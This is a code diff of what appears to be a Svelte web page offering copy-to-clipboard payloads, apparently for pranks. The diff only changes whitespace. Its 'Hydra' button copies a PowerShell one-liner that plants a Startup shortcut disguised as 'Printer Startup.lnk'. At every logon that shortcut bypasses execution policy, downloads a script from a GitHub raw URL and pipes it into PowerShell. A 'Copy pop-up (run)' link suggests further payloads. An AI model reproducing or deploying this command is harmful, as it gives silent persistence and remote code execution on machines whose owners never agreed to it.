@@ -31,7 +31,7 @@
     }
 
     function copyHydra() {
-        navigator.clipboard.writeText(`$WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut("$Home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Printer Startup.lnk");$Shortcut.TargetPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";$Shortcut.Arguments = '-ExecutionPolicy Bypass -NoLogo "(Invoke-Webrequest \\"https://raw.githubusercontent.com/TheLudde235/powershell/main/test/hydra.ps1\\").content | powershell.exe"';$Shortcut.Save();exit;`)
+        navigator.clipboard.writeText(`$WshShell=New-Object -comObject WScript.Shell;$Shortcut=$WshShell.CreateShortcut("$Home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Printer Startup.lnk");$Shortcut.TargetPath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";$Shortcut.Arguments='-ExecutionPolicy Bypass -NoLogo "(Invoke-Webrequest \\"https://raw.githubusercontent.com/TheLudde235/powershell/main/test/hydra.ps1\\").content | powershell.exe"';$Shortcut.Save();exit;`)
     }
 
     function clear($event) {
@@ -58,8 +58,7 @@
         id="popup-input"
         bind:value={popupContent}
     />
-    <a href="#" on:click={copyPopup(popupContent)}><h1>Copy pop-up (run)</h1></a
-    >
+    <a href="#" on:click={copyPopup(popupContent)}><h1>Copy pop-up (run)</h1></a>
     <a href="#" on:click={copyHydra()} class="script">Hydra</a>
 
     {#each funnies as funny}
